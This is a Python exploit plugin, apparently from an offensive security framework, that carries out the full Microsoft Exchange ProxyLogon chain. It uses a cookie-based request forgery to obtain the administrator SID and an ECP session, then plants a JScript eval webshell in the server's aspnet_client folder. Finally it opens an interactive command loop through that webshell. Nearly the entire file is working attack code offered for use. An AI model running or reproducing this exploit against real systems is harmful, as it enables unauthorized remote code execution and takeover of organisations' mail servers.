import argparse
import random
import re
import string
import time
from copy import copy

import requests

from plugins.Exchange import PluginExchangeBase
from utils import output
from utils.consts import AllPluginTypes


class PluginExchangeProxyLogon(PluginExchangeBase):
    display = "Exchange ProxyLogon"
    alias = "ex_prolgon"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", "--domain", help="target domain name or ip address", required=True, dest="target")
        parser.add_argument("-e", "--email", help="email", required=True, dest="email")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        target = args.target
        email = args.email
        shell_name = "shell.aspx"
        random_name = id_generator(3) + ".js"
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

        shell_path = "inetpub\\wwwroot\\aspnet_client\\%s" % shell_name
        shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
        shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'

        autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        """ % email

        output.debug("Attacking target " + target)

        FQDN = "EXCHANGE"
        ct = requests.get(f"https://{target}/ecp/{random_name}", headers={
            "Cookie": "X-BEResource=localhost~1942062522",
            "User-Agent": user_agent
        }, verify=False)

        if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
            FQDN = ct.headers["X-FEServer"]

        ct = requests.post(f"https://{target}/ecp/{random_name}", headers={
            "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
            "Content-Type": "text/xml",
            "User-Agent": user_agent
        }, data=autoDiscoverBody, verify=False)

        if ct.status_code != 200:
            output.error("Autodiscover Error! (Email is invalid)")
            return result
        if "<LegacyDN>" not in ct.text:
            output.error("Can not get LegacyDN!")
            return result

        legacyDn = ct.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
        mailboxid = ct.text.split('<Server>')[1].split('</Server>')[0]
        output.info("Got DN: " + legacyDn)

        mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" % (FQDN, mailboxid),
            "Content-Type": "application/mapi-http",
            "X-Requesttype": "Connect",
            "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
            "X-Clientapplication": "Outlook/15.0.4815.1002",
            "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
            "User-Agent": user_agent
        }, data=mapi_body, verify=False)

        if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.text:
            output.error("Mapi Error!")
            return result

        sid = ct.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
        if sid.rsplit("-", 1)[1] != '500':
            sid = sid.rsplit("-", 1)[0] + '-500'
        output.info("Got SID: " + sid)

        proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
        """ % sid

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
            "Content-Type": "text/xml",
            "msExchLogonAccount": "%s" % sid,
            "msExchLogonMailbox": "%s" % sid,
            "msExchTargetMailbox": "%s" % sid,
            "User-Agent": user_agent
        }, data=proxyLogon_request, verify=False)

        if ct.status_code != 241 or not "msExchEcpCanary" in ct.headers["Set-Cookie"]:
            output.error("Proxylogon Error!")
            return result

        sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

        msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
        output.info("Got session id: " + sess_id)
        output.info("Got canary: " + msExchEcpCanary)

        ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=Admin@%s:444/ecp/DLPPolicy/ManagePolicyFromISV.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                FQDN, sess_id, msExchEcpCanary),
            "msExchLogonAccount": "%s" % sid,
            "msExchLogonMailbox": "%s" % sid,
            "msExchTargetMailbox": "%s" % sid,
            "User-Agent": user_agent
        }, verify=False)

        if ct.status_code != 200:
            output.error("Wrong canary!")
            output.info("Sometime we can skip this ...")
        x = re.findall("<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" />", ct.text)
        output.success('Got viewstate: ' + x[0])

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
            "Content-Type": "application/json; charset=utf-8",
            "msExchLogonAccount": "%s" % sid,
            "msExchLogonMailbox": "%s" % sid,
            "msExchTargetMailbox": "%s" % sid,
            "User-Agent": user_agent

        }, json={
            "filter": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "SelectedView": "", "SelectedVDirType": "All"
                }
            },
            "sort": {}
        }, verify=False)

        if ct.status_code != 200:
            output.error("GetOAB Error!")
            return result
        oabId = ct.text.split('"RawIdentity":"')[1].split('"')[0]
        output.info("Got OAB id: " + oabId)

        oab_json = {
            "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "ExternalUrl": "http://ffff/#%s" % shell_content
                }
            }
        }

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
            "Content-Type": "application/json; charset=utf-8",
            "msExchLogonAccount": "%s" % sid,
            "msExchLogonMailbox": "%s" % sid,
            "msExchTargetMailbox": "%s" % sid,
            "User-Agent": user_agent
        }, json=oab_json, verify=False)

        if ct.status_code != 200:
            output.error("Set external url Error!")
            return result

        reset_oab_body = {
            "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "FilePathName": shell_absolute_path
                }
            }
        }

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
            "Content-Type": "application/json; charset=utf-8",
            "msExchLogonAccount": "%s" % sid,
            "msExchLogonMailbox": "%s" % sid,
            "msExchTargetMailbox": "%s" % sid,
            "User-Agent": user_agent
        }, json=reset_oab_body, verify=False)

        if ct.status_code != 200:
            output.error("Write Shell Error!")
            return result

        output.info("sleeping 2s")
        time.sleep(2)

        req_test = requests.get('https://%s/aspnet_client/%s' % (target, shell_name), verify=False)
        if "OAB (Default Web Site)" in req_test.text:
            output.success('Webshell drop at https://%s/aspnet_client/%s .. Have fun!' % (target, shell_name))
            output.success(
                'Code: curl -ik https://%s/aspnet_client/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\'' % (
                    target, shell_name))
            output.info('Starting semi-interactive')
            while True:
                cmd = input('CMD # ')
                shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())''' % cmd
                shell_req = requests.post('https://%s/aspnet_client/%s' % (target, shell_name),
                                          headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                   'User-Agent': user_agent}, data=shell_body_exec, verify=False,
                                          timeout=15)
                if shell_req.status_code == 200:
                    output.info(shell_req.text.split('Name                            :')[0])
                elif shell_req.status_code == 500:
                    output.error('Maybe AV is killing it?')
                    return result
        else:
            output.error('Webshell not found due to Covid, try again!')

        return result


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
